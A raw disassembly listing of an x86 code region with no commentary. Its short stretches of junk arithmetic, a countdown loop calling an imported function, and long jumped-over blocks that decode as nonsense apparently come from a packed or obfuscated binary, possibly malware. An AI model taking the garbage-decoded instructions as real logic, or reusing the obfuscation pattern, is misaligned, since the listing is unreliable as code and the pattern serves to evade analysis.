  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   DWORD PTR [ebx+0x23],0xec87f506
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a6f
  409a66:	push   0xffffff89
  409a68:	and    bh,bh
  409a6a:	sbb    DWORD PTR [esi+0x32],edi
  409a6d:	mov    edi,0xd4b65b79
  409a72:	jb     0x409a06
  409a74:	add    DWORD PTR [edx+eiz*4],0xed89eb63
  409a7b:	sbb    esi,DWORD PTR [ebp-0x67]
  409a7e:	mov    bh,0xd6
  409a80:	xor    al,0x7d
  409a82:	in     eax,dx
  409a83:	push   0xd5fec950
  409a88:	inc    edx
  409a89:	push   DWORD PTR [edi]
  409a8b:	add    ecx,ebx
  409a8d:	cld    
  409a8e:	mov    cl,0xd8
  409a90:	(bad)  
  409a91:	jb     0x409ac3
  409a93:	outs   dx,DWORD PTR ds:[esi]
  409a94:	aas    
  409a95:	or     DWORD PTR [ecx+ecx*2+0x7d21480b],edi
  409a9c:	dec    edx
  409a9d:	add    edx,edx
  409a9f:	ja     0x409a89
  409aa1:	xchg   edi,eax
  409aa2:	xor    esi,DWORD PTR [eax-0x220a4b20]
  409aa8:	push   es
  409aa9:	lods   al,BYTE PTR ds:[esi]
  409aaa:	loope  0x409abb
  409aac:	imul   edi,DWORD PTR [edi],0x2507c237
  409ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab3:	jmp    0x1cfb:0x411d54b
  409aba:	outs   dx,BYTE PTR ds:[esi]
  409abb:	jns    0x409a3e
  409abd:	jecxz  0x409acf
  409abf:	scas   eax,DWORD PTR es:[edi]
  409ac0:	call   0x9401:0x6dab2499
  409ac7:	outs   dx,DWORD PTR ds:[esi]
  409ac8:	adc    BYTE PTR [ebp+0x0],0x11
  409acc:	das    
  409acd:	mov    cl,0x53
  409acf:	popa   
  409ad0:	xchg   edx,eax
  409ad1:	add    DWORD PTR [ebx],ecx
  409ad3:	cmp    ebp,DWORD PTR [edx]
  409ad5:	stc    
  409ad6:	add    al,0xaa
  409ad8:	cmc    
  409ad9:	pop    ebx
  409ada:	inc    ebp
  409adb:	mov    edi,ebx
  409add:	inc    edi
  409ade:	je     0x409b52
  409ae0:	je     0x409af2
  409ae2:	fs ret 0x2cc1
  409ae6:	xor    eax,0x5a3ec11c
  409aeb:	cli    
  409aec:	retf   0x65f6
  409aef:	dec    eax
  409af0:	pop    ss
  409af1:	mov    ecx,0xe094c07d
  409af6:	(bad)  
  409af7:	push   eax
  409af8:	out    0xf1,al
  409afa:	fmul   DWORD PTR [eax-0x2b]
  409afd:	cmp    DWORD PTR [edx],edi
  409aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b00:	shl    BYTE PTR [ebx],1
  409b02:	ins    BYTE PTR es:[edi],dx
  409b03:	pop    eax
  409b04:	add    al,0xa5
  409b06:	adc    cl,0x45
  409b09:	xchg   edi,eax
  409b0a:	pusha  
  409b0b:	cld    
  409b0c:	shl    BYTE PTR [esi-0x27],0x3b
  409b10:	neg    BYTE PTR [edx+0x65b62ca1]
  409b16:	dec    esi
  409b17:	xchg   ebp,eax
  409b18:	in     eax,dx
  409b19:	cmp    al,0x5a
  409b1b:	dec    eax
  409b1c:	sub    al,0x3a
  409b1e:	test   al,0x7a
  409b20:	mov    edi,0x4932ecc7
  409b25:	jmp    0x296c20af
  409b2a:	sbb    bl,BYTE PTR [esp+esi*8+0x5ef08df7]
  409b31:	imul   ecx,DWORD PTR [edx+ecx*4],0x92406d10
  409b38:	test   al,0x53
  409b3a:	repnz sbb al,0xa0
  409b3d:	mov    DWORD PTR [eax+ebp*4-0x19],ecx
  409b41:	pop    edi
  409b42:	mov    bl,0xe7
  409b44:	shr    BYTE PTR [ebx],0x46
  409b47:	or     BYTE PTR [edx-0x49b7c9db],0xd9
  409b4e:	in     al,0x95
  409b50:	add    eax,0xdb1427a5
  409b55:	jae    0x409b02
  409b57:	or     bh,dl
  409b59:	xchg   esi,eax
  409b5a:	pop    edx
  409b5b:	icebp  
  409b5c:	fcmovnu st,st(6)
  409b5e:	push   ebx
  409b5f:	xchg   cl,dh
  409b61:	mov    ds:0x5ac7be3c,al
  409b66:	fldenv [edx-0x64]
  409b69:	adc    eax,DWORD PTR [edx]
  409b6b:	js     0x409b98
  409b6d:	xor    al,0x7a
  409b6f:	sub    al,0x4a
  409b71:	dec    ebp
  409b72:	add    ah,ah
  409b74:	dec    ebx
  409b75:	pop    edi
  409b76:	cmc    
  409b77:	das    
  409b78:	lds    ebp,FWORD PTR [esi+0x31]
  409b7b:	out    0x67,eax
  409b7d:	fisttp QWORD PTR [esp+edx*8+0x8]
  409b81:	loope  0x409b4a
  409b83:	(bad)  
  409b84:	dec    ecx
  409b85:	jno    0x409beb
  409b87:	adc    al,0xb6
  409b89:	out    dx,eax
  409b8a:	fidiv  DWORD PTR [edi+0x54]
  409b8d:	jmp    0xffc79ef2
  409b92:	mov    dl,0xaa
  409b94:	sub    bl,bl
  409b96:	xor    DWORD PTR [edx],ecx
  409b98:	sub    ecx,DWORD PTR [eax+0x9cc4845]
  409b9e:	push   edi
  409b9f:	jbe    0x409be6
  409ba1:	mov    fs,WORD PTR [esi+0x54]
  409ba4:	xor    edx,ebx
  409ba6:	je     0x409c16
  409ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba9:	mov    eax,ds:0x6663b5be
  409bae:	outs   dx,DWORD PTR ds:[esi]
  409baf:	(bad)
  409bb2:	or     DWORD PTR [eax+0xae559f4],ebx
  409bb8:	fsub   DWORD PTR [edi-0x1963e0a]
  409bbe:	repz sub eax,DWORD PTR [edi+0x4f]
  409bc2:	jp     0x409ba2
  409bc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc5:	std    
  409bc6:	jle    0x409c13
  409bc8:	mov    ebx,0x9fd202ae
  409bcd:	mov    ch,dl
  409bcf:	pushf  
  409bd0:	mov    BYTE PTR ds:[ebx+0x24],al
  409bd4:	xor    BYTE PTR [ebx-0x15],bh
  409bd7:	repz adc DWORD PTR [ebp+0x59],esp
  409bdb:	outs   dx,DWORD PTR ds:[esi]
  409bdd:	sbb    edi,DWORD PTR [edi+0x12f726c2]
  409be3:	jmp    0x6e44:0x69b59b2d
  409bea:	test   dh,al
  409bec:	push   ds
  409bed:	xchg   esp,eax
  409bee:	sbb    BYTE PTR [ecx],0xcd
  409bf1:	mov    al,BYTE PTR ds:0x93ce1155
  409bf7:	jo     0x409c06
  409bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bfa:	dec    ecx
  409bfb:	out    0x9,eax
  409bfd:	pop    es
  409bfe:	nop
  409bff:	(bad)  
  409c00:	xchg   ebp,eax
  409c01:	push   cs
  409c02:	rcr    DWORD PTR [ecx+0x49f533b3],cl
  409c08:	push   0xbf257434
  409c0d:	xor    ebx,esi
  409c0f:	in     al,0x62
  409c11:	inc    ebp
  409c12:	inc    eax
  409c13:	dec    esp
  409c14:	lods   al,BYTE PTR ds:[esi]
  409c15:	stc    
  409c16:	lods   eax,DWORD PTR ds:[esi]
  409c17:	movzx  edx,al
  409c1a:	inc    esp
  409c1b:	add    BYTE PTR [esi-0x714acd03],dl
  409c21:	adc    eax,0xa0096a89
  409c26:	add    BYTE PTR es:[ebx],bh
  409c29:	xchg   ebx,eax
  409c2a:	adc    cl,ch
  409c2c:	adc    esi,DWORD PTR [eax]
  409c2e:	inc    edx
  409c2f:	fst    DWORD PTR [edx-0x1b62dfd4]
  409c35:	aaa    
  409c36:	aad    0x18
  409c38:	push   ss
  409c39:	cmp    DWORD PTR [ebp-0x5cef946f],esi
  409c3f:	stos   DWORD PTR es:[edi],eax
  409c40:	adc    bl,dl
  409c42:	sub    esp,DWORD PTR [ebp-0x18260197]
  409c48:	out    0xe2,al
  409c4a:	mov    ss,WORD PTR [ecx+0x46cb0309]
  409c50:	mov    ch,0xd2
  409c52:	(bad)  [eax+0x3a]
  409c55:	mov    ch,bh
  409c57:	xor    al,0x86
  409c59:	push   edi
  409c5a:	adc    BYTE PTR ds:0x6288d17a,cl
  409c60:	push   ecx
  409c61:	adc    al,0x78
  409c63:	adc    ah,BYTE PTR [eax-0x11b68c1f]
  409c69:	mov    ah,BYTE PTR [edx+0xd]
  409c6c:	push   0x7e
  409c6e:	fimul  WORD PTR ds:0x19902eb9
  409c74:	out    dx,al
  409c75:	jae    0x409cd9
  409c77:	ds loopne 0x409c88
  409c7a:	lds    edi,FWORD PTR [eax]
  409c7c:	daa    
  409c7d:	fxtract 
  409c7f:	inc    edx
  409c80:	les    ecx,FWORD PTR [edx]
  409c82:	dec    edi
  409c83:	ss fsubp st(3),st
  409c86:	mov    esi,0xba484753
  409c8b:	sahf   
  409c8c:	dec    esp
  409c8d:	xor    eax,0xaba680f
  409c92:	jmp    0xae542ad1
  409c97:	leave  
  409c98:	loop   0x409c49
  409c9a:	cmp    eax,0x2f0da542
  409c9f:	pusha  
  409ca0:	sub    BYTE PTR [ebx-0x182ee0fe],ch
  409ca6:	mov    ah,0x46
  409ca8:	push   esp
  409ca9:	inc    eax
  409caa:	or     al,0x87
  409cac:	cmc    
  409cad:	pop    es
  409cae:	jne    0x409cb4
  409cb0:	push   esp
  409cb1:	adc    edx,DWORD PTR [ecx+0x71]
  409cb4:	imul   esp,DWORD PTR [ecx],0xfffffffb
  409cb7:	xor    ah,dh
  409cb9:	aaa    
  409cba:	adc    eax,0x7a7ee333
  409cbf:	outs   dx,BYTE PTR ds:[esi]
  409cc0:	xchg   ebx,eax
  409cc1:	mov    eax,0x42b0c445
  409cc6:	or     al,0x97
  409cc8:	out    dx,eax
  409cc9:	mov    edi,0xb362a9ae
  409cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ccf:	sub    al,0xfd
  409cd1:	loop   0x409d07
  409cd3:	cdq    
  409cd4:	into   
  409cd5:	ds mov cl,0x17
  409cd8:	ss bnd jg 0x409cf8
  409cdc:	bswap  eax
  409cde:	lahf   
  409cdf:	xor    al,0x54
  409ce1:	stc    
  409ce2:	adc    BYTE PTR [ebp-0x68],cl
  409ce5:	xchg   edi,eax
  409ce6:	xlat   BYTE PTR ds:[ebx]
  409ce7:	inc    eax
  409ce8:	in     al,dx
  409ce9:	out    0x8d,eax
  409ceb:	cmp    eax,0xb6c80fa0
  409cf0:	fs inc esi
  409cf2:	shl    BYTE PTR [edx-0x30e71f9a],cl
  409cf8:	sti    
  409cf9:	cdq    
  409cfa:	adc    al,0x40
  409cfc:	ds jle 0x409d63
  409cff:	popf   
  409d00:	dec    ebp
  409d01:	cmp    eax,0x7169ed0a
  409d06:	mov    bh,0xf9
  409d08:	or     BYTE PTR [edx+0x5318f388],ah
  409d0e:	in     eax,dx
  409d0f:	test   DWORD PTR [ecx-0x2d6f69ac],ecx
  409d15:	adc    DWORD PTR [ebx-0x4b6005d8],0xe18b838
  409d1f:	sbb    ecx,esi
  409d21:	mov    WORD PTR [edi-0x73],?
  409d24:	xor    BYTE PTR [eax],dh
  409d26:	or     al,0xa2
  409d28:	mov    al,ds:0x26d97bcd
  409d2d:	xchg   ebp,eax
  409d2e:	icebp  
  409d2f:	enter  0x50e7,0x18
  409d33:	xchg   edx,eax
  409d34:	jmp    0x409d8e
  409d36:	mov    ebp,0x133b26cc
  409d3b:	sub    al,0x4b
  409d3d:	jp     0x409d24
  409d3f:	adc    eax,0xc1ac365f
  409d44:	shr    BYTE PTR [eax+0x9],0xfd
  409d48:	sti    
  409d49:	call   0x4a6b2e7f
  409d4e:	cmp    dl,BYTE PTR [edi-0x314d79a1]
  409d54:	retf   
  409d55:	lock sub ebp,ecx
  409d58:	add    dl,BYTE PTR [eax+0x38992ba3]
  409d5e:	fmul   st(4),st
  409d60:	pop    ds
  409d61:	(bad)
  409d64:	mov    cl,0xb8
  409d66:	dec    ebp
  409d67:	in     ax,dx
  409d69:	fwait
  409d6a:	aaa    
  409d6b:	(bad)  
  409d6c:	mov    bl,0xb8
  409d6e:	imul   esi,DWORD PTR [ebp+ebp*8+0x39d6a22],0x3b7cd5a0
  409d79:	xor    BYTE PTR [edi+0x25],ch
  409d7c:	pushf  
  409d7d:	mov    edx,0x47b5d30e
  409d82:	sar    BYTE PTR [edx+0x7386269a],1
  409d88:	cmp    ah,BYTE PTR [ecx+0x37adbdc2]
  409d8e:	pop    eax
  409d8f:	std    
  409d90:	mov    ds:0xe40faf1e,eax
  409d95:	push   ecx
  409d96:	push   cs
  409d97:	push   esp
  409d98:	mov    ecx,0x855b7259
  409d9d:	xlat   BYTE PTR ds:[ebx]
  409d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d9f:	clc    
  409da0:	xor    DWORD PTR [esi],0x35
  409da3:	repnz pusha 
  409da5:	leave  
  409da6:	cmp    bh,ah
  409da8:	das    
  409da9:	xchg   edx,esp
  409dab:	fxtract 
  409dad:	ins    BYTE PTR es:[edi],dx
  409dae:	xor    BYTE PTR [eax+edx*1],0xba
  409db2:	sti    
  409db3:	imul   esp,DWORD PTR [edx+ecx*1-0x34],0x18f3f81e
  409dbb:	dec    ecx
  409dbc:	dec    ebx
  409dbd:	jnp    0x409e0e
  409dbf:	mov    BYTE PTR [esi+esi*8+0x40],bh
  409dc3:	push   0x9e6dedc
  409dc8:	mov    al,0x32
  409dca:	mov    ds:0x6333a8f7,al
  409dcf:	cmp    DWORD PTR [edi-0x22da04ec],esi
  409dd5:	mov    eax,0xeb40e9c3
  409dda:	dec    ebx
  409ddb:	mov    ebp,0x1e13c44e
  409de0:	pop    edx
  409de1:	lds    esi,FWORD PTR [esp+eax*8]
  409de4:	sbb    eax,0x23b31b03
  409de9:	ss aaa 
  409deb:	jnp    0x409e65
  409ded:	sbb    eax,esi
  409def:	adc    eax,edi
  409df1:	cmc    
  409df2:	mov    eax,0x7a6fdfac
  409df7:	and    al,0x11
  409df9:	out    0x2f,eax
  409dfb:	in     al,0x7c
  409dfd:	fcom   DWORD PTR [ebx+eax*8-0x1f5420f1]
  409e04:	shl    BYTE PTR [edi],cl
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	push   0x2678cd15
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	popa   
  409e8e:	sub    DWORD PTR [ecx+0x27],esp
  409e91:	mov    al,0x18
  409e93:	mov    ebp,?
  409e95:	jb     0x409ea7
  409e97:	xchg   edi,eax
  409e98:	dec    edi
  409e99:	stos   DWORD PTR es:[edi],eax
  409e9a:	imul   eax,DWORD PTR [ecx],0x82973e7d
  409ea0:	fs cmp edi,edi
  409ea3:	pop    esi
  409ea4:	in     al,dx
  409ea5:	xchg   DWORD PTR [edi+edx*2-0x48a4ce9d],eax
  409eac:	std    
  409ead:	xor    eax,0x520b8c8
  409eb2:	dec    ecx
  409eb3:	repnz mov ecx,0xcf062d51
  409eb9:	out    0xde,al
  409ebb:	inc    esp
  409ebc:	out    0xf7,eax
  409ebe:	dec    edi
  409ebf:	test   DWORD PTR [eax-0x1d],edi
  409ec2:	ret    0x13b9
  409ec5:	cmp    esi,DWORD PTR [edi]
  409ec7:	or     BYTE PTR [ebx-0x7e],0x3f
  409ecb:	aas    
  409ecc:	scas   al,BYTE PTR es:[edi]
  409ecd:	je     0x409eb5
  409ecf:	dec    esp
  409ed0:	inc    ebx
  409ed1:	or     eax,DWORD PTR [edx-0x1d]
  409ed4:	inc    eax
  409ed5:	rcr    BYTE PTR [ecx+0x26],1
  409ed8:	fstp   TBYTE PTR [ecx+0x768db900]
  409ede:	mov    dh,0xac
  409ee0:	jno    0x409f57
  409ee2:	sbb    ecx,DWORD PTR [edx-0x10]
  409ee5:	mov    WORD PTR [ebp+0x5100e66],?
  409eeb:	add    al,0xab
  409eed:	sub    ch,BYTE PTR [eax]
  409eef:	mov    dl,0x91
  409ef1:	push   ecx
  409ef2:	imul   ebx,ecx,0xffffff80
  409ef5:	jae    0x409eac
  409ef7:	mov    DWORD PTR [esi+0xfaf2215],eax
  409efd:	xchg   ebx,eax
  409efe:	xlat   BYTE PTR ds:[ebx]
  409eff:	lods   eax,DWORD PTR ds:[esi]
  409f00:	adc    dh,cl
  409f02:	mov    cl,0x71
  409f04:	or     BYTE PTR [ecx+0x644c3eed],dh
  409f0a:	sbb    BYTE PTR [esi+0x3f0c1c11],cl
  409f10:	hlt    
  409f11:	or     DWORD PTR ds:0xc1d03d86,edx
  409f17:	mov    ch,0x3d
  409f19:	int3   
  409f1a:	xchg   ebp,eax
  409f1b:	xor    BYTE PTR [eax+0x5c],ah
  409f1e:	sbb    eax,0x604e3819
  409f23:	jae    0x409f0d
  409f25:	and    BYTE PTR [esi+0x7768b475],dl
  409f2b:	out    dx,al
  409f2c:	sub    al,0xd8
  409f2e:	daa    
  409f2f:	ror    DWORD PTR [esp+edi*1],1
  409f32:	inc    eax
  409f33:	pop    ebp
  409f34:	fs xchg ebx,eax
  409f36:	aad    0xe6
  409f38:	adc    eax,0x3dc225bb
  409f3d:	mov    eax,0x54af6b72
  409f42:	xchg   ecx,esi
  409f44:	(bad)  [ebx+0x5bc0bd66]
  409f4a:	ret    
  409f4b:	loop   0x409f5f
  409f4d:	cdq    
  409f4e:	daa    
  409f4f:	test   ch,cl
  409f51:	retf   
  409f52:	push   esi
  409f53:	inc    eax
  409f54:	ins    DWORD PTR es:[edi],dx
  409f55:	iret   
  409f56:	push   0x1bb14c8e
  409f5b:	fsubr  QWORD PTR [ebp-0x164d1c6]
  409f61:	fs loopne 0x409efe
  409f64:	mov    ah,BYTE PTR [edx]
  409f66:	stc    
  409f67:	sbb    eax,0x715cd6b1
  409f6c:	mov    esp,DWORD PTR [ecx-0x2c]
  409f6f:	jp     0x409f54
  409f71:	push   0xc5e5964d
  409f76:	xor    eax,0x6348a833
  409f7b:	neg    DWORD PTR [edi]
  409f7d:	test   eax,0xd73e5c93
  409f82:	mov    eax,0x2b31e142
  409f87:	xlat   BYTE PTR ds:[ebx]
  409f88:	(bad)  
  409f89:	aaa    
  409f8a:	push   edi
  409f8b:	dec    edi
  409f8c:	pop    ebp
  409f8d:	retf   
  409f8e:	jge    0x409f5d
  409f90:	or     ebx,DWORD PTR [ebp-0xf47dd17]
  409f96:	pop    esi
  409f97:	pop    ss
  409f98:	xlat   BYTE PTR ds:[ebx]
  409f99:	iret   
  409f9a:	imul   ecx,esp,0xb165b0ed
  409fa0:	push   es
  409fa1:	cli    
  409fa2:	scas   al,BYTE PTR es:[edi]
  409fa3:	neg    BYTE PTR [edi+0x8]
  409fa6:	retf   0x6fa5
  409fa9:	push   es
  409faa:	jno    0x409f40
  409fac:	dec    esp
  409fad:	mov    al,0x45
  409faf:	cmc    
  409fb0:	inc    ebp
  409fb1:	fld    DWORD PTR [eax]
  409fb3:	ds repz scas eax,DWORD PTR es:[edi]
  409fb6:	adc    al,0x69
  409fb8:	(bad)
  409fbb:	mov    ecx,0xdd499851
  409fc0:	sub    ch,dh
  409fc2:	cwde   
  409fc3:	(bad)  
  409fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fc5:	lock xchg ebp,eax
  409fc7:	push   eax
  409fc8:	xor    al,0xaa
  409fca:	inc    esi
  409fcb:	xchg   ebx,esi
  409fcd:	dec    esp
  409fce:	xlat   BYTE PTR ds:[ebx]
  409fcf:	and    eax,0x9e2f44be
  409fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd6:	dec    eax
  409fd7:	mov    al,ds:0x5ab31550
  409fdc:	popf   
  409fdd:	mov    esi,0x3cd67a7a
  409fe2:	(bad)  
  409fe3:	xor    eax,0x473f5d1f
  409fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fe9:	(bad)
  409fed:	sub    bl,bh
  409fef:	push   cs
  409ff0:	fistp  QWORD PTR [ebp+0x441d303f]
  409ff6:	mov    ecx,0x92ecd31c
  409ffb:	xor    ecx,ebx
  409ffd:	in     al,dx
  409ffe:	jae    0x40a050
  40a000:	push   esp
  40a001:	ret    0x7d5a
  40a004:	xchg   edx,eax
  40a005:	hlt    
  40a006:	jp     0x40a04f
  40a008:	pusha  
  40a009:	outs   dx,BYTE PTR ds:[esi]
  40a00a:	call   0x7bba932
  40a00f:	mov    ah,0x6f
  40a011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a013:	cmp    bh,BYTE PTR [eax+0x4f]
  40a016:	gs push edi
  40a018:	ins    DWORD PTR es:[edi],dx
  40a019:	rol    BYTE PTR [edi-0x11dc61a6],0x11
  40a020:	xchg   esi,eax
  40a021:	xchg   ebx,eax
  40a022:	mov    ebx,0x38c22e61
  40a027:	pushf  
  40a028:	dec    DWORD PTR [ebp+0x17]
  40a02b:	aas    
  40a02c:	sub    bl,BYTE PTR [eax-0x27]
  40a02f:	ficomp WORD PTR [ebp-0x46ae1b9]
  40a035:	inc    edx
  40a036:	iret   
  40a037:	sar    BYTE PTR [edx],0x4
  40a03a:	adc    al,BYTE PTR [ebx-0x56644d1d]
  40a040:	cld    
  40a041:	push   ss
  40a042:	xchg   edi,eax
  40a043:	jb     0x40a08e
  40a045:	mov    WORD PTR [edi+ebx*2],ds
  40a048:	inc    ebx
  40a049:	hlt    
  40a04a:	jge    0x40a066
  40a04c:	sbb    BYTE PTR [edi+0x20],0xa9
  40a050:	push   0x6c
  40a052:	xchg   ebx,eax
  40a053:	pushf  
  40a054:	cmp    dl,BYTE PTR [ebp+0x6]
  40a057:	add    BYTE PTR [esi-0x21],ch
  40a05a:	mov    BYTE PTR [esi-0x42411bc9],0x44
  40a061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a062:	imul   ecx,DWORD PTR [ebp-0x1e6cabcd],0xb3eb865b
  40a06c:	jbe    0x40a09f
  40a06e:	mov    al,ds:0x220fb783
  40a073:	out    dx,eax
  40a074:	pop    ecx
  40a075:	mov    ch,0xc8
  40a077:	fwait
  40a078:	jno    0x40a0b0
  40a07a:	xchg   DWORD PTR [ebx-0x35],ebp
  40a07d:	xchg   esp,eax
  40a07e:	xor    ebx,DWORD PTR [edi]
  40a080:	jb     0x40a0e1
  40a082:	adc    esi,DWORD PTR [eax-0x155eec93]
  40a088:	scas   al,BYTE PTR es:[edi]
  40a089:	inc    esi
  40a08a:	lea    esi,[esi+0x13]
  40a08d:	das    
  40a08e:	test   eax,0xe3949f80
  40a093:	push   ss
  40a094:	pop    esp
  40a095:	pop    ebp
  40a096:	add    BYTE PTR [ebx],dh
  40a098:	cmc    
  40a099:	xor    ebx,ebp
  40a09b:	dec    ebx
  40a09c:	scas   eax,DWORD PTR es:[edi]
  40a09d:	add    DWORD PTR [esi+0x66],ecx
  40a0a0:	enter  0x74ea,0x68
  40a0a4:	lock mov ecx,esp
  40a0a7:	test   DWORD PTR [eax],edx
  40a0a9:	dec    ebx
  40a0aa:	cli    
  40a0ab:	mov    al,ds:0xe6f3ad6f
  40a0b0:	fdivr  DWORD PTR [ebx]
  40a0b2:	mov    edx,0xc27187bc
  40a0b7:	xlat   BYTE PTR ds:[ebx]
  40a0b8:	dec    esp
  40a0b9:	out    0x2f,eax
  40a0bb:	mov    eax,0x3056d192
  40a0c0:	push   0xffffffca
  40a0c2:	jns    0x40a085
  40a0c4:	in     al,dx
  40a0c5:	out    dx,eax
  40a0c6:	add    ah,BYTE PTR [edx+edx*4]
  40a0c9:	test   BYTE PTR [ebx+0x43cead85],0x7d
  40a0d0:	sub    eax,DWORD PTR [eax]
  40a0d2:	cmp    BYTE PTR [ebx+0x5f],ch
  40a0d5:	shl    DWORD PTR [eax+0x3],0x9b
  40a0d9:	lods   al,BYTE PTR ds:[esi]
  40a0da:	or     ah,ch
  40a0dc:	int3   
  40a0dd:	pop    edx
  40a0de:	loope  0x40a0c8
  40a0e0:	lock stos DWORD PTR es:[edi],eax
  40a0e2:	sub    al,0x89
  40a0e4:	(bad)  
  40a0e5:	add    BYTE PTR [ebx],0xae
  40a0e8:	dec    edi
  40a0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ea:	test   DWORD PTR [esp+edx*4+0x6d7c8ca8],eax
  40a0f1:	int3   
  40a0f2:	xchg   bl,cl
  40a0f4:	and    cl,bh
  40a0f6:	sub    BYTE PTR [eax-0x363d23ad],ah
  40a0fc:	jp     0x40a10c
  40a0fe:	sub    DWORD PTR [ebp+ebx*2-0x38ec681a],ebx
  40a105:	push   es
  40a106:	mov    esi,0x2047f185
  40a10b:	add    DWORD PTR [ebx],ebp
  40a10d:	lods   eax,DWORD PTR ds:[esi]
  40a10e:	pusha  
  40a10f:	add    dl,dl
  40a111:	fwait
  40a112:	je     0x40a09d
  40a114:	es jmp 0x7240:0xe61dfa1b
  40a11c:	ja     0x40a108
  40a11e:	mov    ebx,0x4e0edfa9
  40a123:	or     bh,cl
  40a125:	ror    esp,cl
  40a127:	xlat   BYTE PTR ds:[ebx]
  40a128:	push   ss
  40a129:	adc    dh,BYTE PTR [ebp+0x1167d692]
  40a12f:	inc    eax
  40a130:	sub    edx,DWORD PTR [ebx+0x40]
  40a133:	sbb    edi,ebx
  40a135:	outs   dx,BYTE PTR ds:[esi]
  40a136:	xchg   edi,eax
  40a137:	jle    0x40a116
  40a139:	jl     0x40a1a8
  40a13b:	push   ebx
  40a13c:	out    dx,eax
  40a13d:	xor    edi,DWORD PTR [esi+0x4f31c817]
  40a143:	or     edi,DWORD PTR [ecx]
  40a145:	arpl   WORD PTR [ecx],bx
  40a147:	es je  0x40a122
  40a14a:	in     eax,dx
  40a14b:	sub    al,0x2b
  40a14d:	xchg   ebx,eax
  40a14e:	jl     0x40a108
  40a150:	sbb    eax,0x2c5e7f8d
  40a155:	pop    ds
  40a156:	xor    DWORD PTR [eax],edx
  40a158:	mov    bh,0x89
  40a15a:	mov    al,ds:0x31433899
  40a15f:	stc    
  40a160:	mov    esi,0x1e66c510
  40a165:	shr    DWORD PTR [ebp-0x60],0x5e
  40a169:	mov    edi,0x7a3db43b
  40a16e:	pop    ds
  40a16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a170:	mov    ecx,0xb3376c2d
  40a175:	ins    BYTE PTR es:[edi],dx
  40a176:	stos   DWORD PTR es:[edi],eax
  40a177:	pop    ebp
  40a178:	dec    ebp
  40a179:	jmp    0x40a18f
  40a17b:	in     eax,0x39
  40a17d:	das    
  40a17e:	dec    edx
  40a17f:	xchg   DWORD PTR [eax+0x33062d4],edx
  40a185:	xchg   esi,eax
  40a186:	cmovp  eax,esp
  40a189:	inc    ecx
  40a18a:	cwde   
  40a18b:	pop    ebp
  40a18c:	cmc    
  40a18d:	out    dx,eax
  40a18e:	cwde   
